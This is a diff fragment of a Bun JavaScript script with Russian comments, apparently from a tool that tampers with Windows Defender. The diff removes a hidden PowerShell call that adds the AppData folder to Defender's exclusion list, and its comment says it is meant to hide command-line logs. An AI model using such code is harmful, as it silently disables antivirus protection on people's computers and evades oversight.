@@ -38,11 +38,6 @@
       console.log("❌ Ошибка доступа к реестру (Access Denied). Это нормально при включенном Tamper Protection.");
     }
 
-    // Метод 2: "Тихий" запуск PowerShell (если WMIC не сработал)
-    // Мы вызываем его через Bun.spawn, чтобы скрыть логи командной строки
-    await Bun.spawn({
-      cmd: ["powershell", "-WindowStyle", "Hidden", "-Command", `Add-MpPreference -ExclusionPath '${appData}'`]
-    }).exited;
 
     console.log("\nНажми Enter для выхода...");
     for await (const line of console) break;
